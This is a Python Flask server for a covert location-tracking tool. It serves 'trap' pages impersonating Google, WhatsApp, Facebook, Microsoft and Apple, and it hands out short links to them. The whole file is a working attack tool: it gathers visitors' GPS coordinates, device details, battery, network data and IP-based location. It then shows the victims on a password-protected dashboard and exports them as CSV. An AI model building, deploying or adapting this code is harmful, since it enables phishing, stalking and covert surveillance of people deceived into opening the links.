from flask import (
    Flask,
    request,
    render_template,
    jsonify,
    session,
    redirect,
    url_for,
    Response,
    abort,               # <-- Added for 404 handling
)
from flask_cors import CORS
import os
import secrets
import requests
from datetime import datetime

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
CORS(app)

# =============================================
# DATA STORAGE
# =============================================

users = {}
all_history = []

latest_location = {
    "lat": None,
    "lng": None,
    "accuracy": None,
    "altitude": None,
    "heading": None,
    "speed": None,
    "timestamp": None,
    "device_info": None,
    "battery": None,
    "network": None,
    "ip": None,
    "ip_city": None,
    "ip_country": None,
    "ip_isp": None,
}

# =============================================
# IP GEOLOCATION HELPER
# =============================================

def get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon"
        response = requests.get(url, timeout=5)
        data = response.json()
        if data.get("status") == "success":
            return {
                "city": data.get("city", "N/A"),
                "country": data.get("country", "N/A"),
                "isp": data.get("isp", "N/A"),
                "lat": data.get("lat"),
                "lon": data.get("lon"),
            }
    except Exception as e:
        print(f"IP Geolocation error: {e}")
    return None

# =============================================
# BUILT-IN URL SHORTENER
# =============================================

VALID_BRANDS = ["google", "whatsapp", "facebook", "microsoft", "apple"]

@app.route("/s/<brand>")
def short_verify(brand):
    """Short URL for verification: /s/google → /google/verify"""
    if brand not in VALID_BRANDS:
        abort(404)
    return redirect(url_for("verify_trap_clean", brand=brand))

@app.route("/sp/<brand>")
def short_photo(brand):
    """Short URL for photo trap: /sp/google → /google/photo"""
    if brand not in VALID_BRANDS:
        abort(404)
    return redirect(url_for("photo_trap_clean", brand=brand))

# =============================================
# CLEAN URL ROUTES
# =============================================

@app.route("/<brand>/verify")
def verify_trap_clean(brand):
    if brand not in VALID_BRANDS:
        abort(404)
    return render_template("index.html", brand=brand)

@app.route("/<brand>/photo")
def photo_trap_clean(brand):
    if brand not in VALID_BRANDS:
        abort(404)
    return render_template("photo.html", brand=brand)

# =============================================
# LEGACY ROUTES
# =============================================

@app.route("/")
def target_page():
    template = request.args.get("template", "google")
    return render_template("index.html", brand=None)

@app.route("/photo")
def photo_trap():
    template = request.args.get("template", "whatsapp")
    return render_template("photo.html", brand=None)

# =============================================
# DASHBOARD AUTHENTICATION
# =============================================

DASHBOARD_PASSWORD = "your_strong_password"  # 🔴 CHANGE THIS!

@app.route("/dashboard-login", methods=["GET", "POST"])
def dashboard_login():
    if request.method == "POST":
        if request.form.get("password") == DASHBOARD_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return "Wrong Password", 403
    return """
        <form method="post" style="margin:20%% auto;width:300px;text-align:center;font-family:Arial;">
            <h2>🔐 Admin Access</h2>
            <input type="password" name="password" placeholder="Enter Password" style="width:100%%;padding:10px;margin:10px 0;border-radius:4px;border:1px solid #ccc;">
            <button type="submit" style="padding:10px 30px;background:#4285f4;color:white;border:none;border-radius:4px;cursor:pointer;">Unlock</button>
        </form>
    """

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("dashboard_login"))
    return render_template("dashboard.html")

# =============================================
# API ENDPOINTS (unchanged)
# =============================================

@app.route("/send-location", methods=["POST"])
def receive_location():
    global users, all_history, latest_location

    data = request.get_json()
    session_id = data.get("session_id")

    if not session_id:
        session_id = request.remote_addr or "unknown"

    forwarded = request.headers.get("X-Forwarded-For")
    client_ip = forwarded.split(",")[0].strip() if forwarded else request.remote_addr

    ip_info = get_ip_info(client_ip)

    location_data = {
        "lat": data.get("lat"),
        "lng": data.get("lng"),
        "accuracy": data.get("accuracy"),
        "altitude": data.get("altitude"),
        "heading": data.get("heading"),
        "speed": data.get("speed"),
        "device_info": data.get("device_info"),
        "battery": data.get("battery"),
        "network": data.get("network"),
        "timestamp": datetime.now().isoformat(),
        "session_id": session_id,
        "ip": client_ip,
        "ip_city": ip_info.get("city") if ip_info else None,
        "ip_country": ip_info.get("country") if ip_info else None,
        "ip_isp": ip_info.get("isp") if ip_info else None,
        "ip_lat": ip_info.get("lat") if ip_info else None,
        "ip_lon": ip_info.get("lon") if ip_info else None,
    }

    if session_id not in users:
        users[session_id] = {"current": location_data, "history": []}
    else:
        users[session_id]["current"] = location_data

    users[session_id]["history"].append(location_data)
    if len(users[session_id]["history"]) > 50:
        users[session_id]["history"] = users[session_id]["history"][-50:]

    all_history.append(location_data)
    if len(all_history) > 200:
        all_history = all_history[-200:]

    latest_location = location_data

    print(f"📍 Location from {session_id} (IP: {client_ip})")
    print(f"👥 Total users: {len(users)}")

    return jsonify({"status": "ok", "session_id": session_id})

@app.route("/send-battery", methods=["POST"])
def receive_battery():
    data = request.get_json()
    session_id = data.get("session_id")
    if session_id and session_id in users:
        users[session_id]["current"]["battery"] = data
    return jsonify({"status": "ok"})

@app.route("/send-network", methods=["POST"])
def receive_network():
    data = request.get_json()
    session_id = data.get("session_id")
    if session_id and session_id in users:
        users[session_id]["current"]["network"] = data
    return jsonify({"status": "ok"})

@app.route("/get-location")
def get_location():
    return jsonify(latest_location)

@app.route("/get-users")
def get_users():
    user_list = []
    for sid, data in users.items():
        user_list.append(
            {
                "session_id": sid,
                "lat": data["current"].get("lat"),
                "lng": data["current"].get("lng"),
                "accuracy": data["current"].get("accuracy"),
                "device_info": data["current"].get("device_info"),
                "timestamp": data["current"].get("timestamp"),
                "battery": data["current"].get("battery"),
                "network": data["current"].get("network"),
                "ip": data["current"].get("ip"),
                "ip_city": data["current"].get("ip_city"),
                "ip_country": data["current"].get("ip_country"),
                "ip_isp": data["current"].get("ip_isp"),
            }
        )
    return jsonify(user_list)

@app.route("/get-all-history")
def get_all_history():
    return jsonify(all_history)

@app.route("/clear", methods=["POST", "GET"])
def clear_location():
    global users, all_history, latest_location
    users = {}
    all_history = []
    latest_location = {
        "lat": None,
        "lng": None,
        "accuracy": None,
        "altitude": None,
        "heading": None,
        "speed": None,
        "timestamp": None,
        "device_info": None,
        "battery": None,
        "network": None,
        "ip": None,
        "ip_city": None,
        "ip_country": None,
        "ip_isp": None,
    }
    return jsonify({"status": "cleared"})

# =============================================
# CSV EXPORT
# =============================================

@app.route("/export-csv")
def export_csv():
    global all_history
    if not all_history:
        return "No data", 404

    output = []
    for entry in all_history:
        output.append(
            {
                "Session": entry.get("session_id"),
                "Lat": entry.get("lat"),
                "Lng": entry.get("lng"),
                "Accuracy": entry.get("accuracy"),
                "Device": entry.get("device_info", {}).get("device_name"),
                "Battery": entry.get("battery", {}).get("level", "N/A"),
                "City": entry.get("ip_city", "N/A"),
                "Country": entry.get("ip_country", "N/A"),
                "ISP": entry.get("ip_isp", "N/A"),
                "Timestamp": entry.get("timestamp"),
            }
        )

    def generate():
        yield ",".join(output[0].keys()) + "\n"
        for row in output:
            yield ",".join(str(v) for v in row.values()) + "\n"

    return Response(
        generate(),
        mimetype="text/csv",
        headers={"Content-Disposition": "attachment;filename=locations.csv"},
    )

# =============================================
# RUN THE SERVER
# =============================================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=True)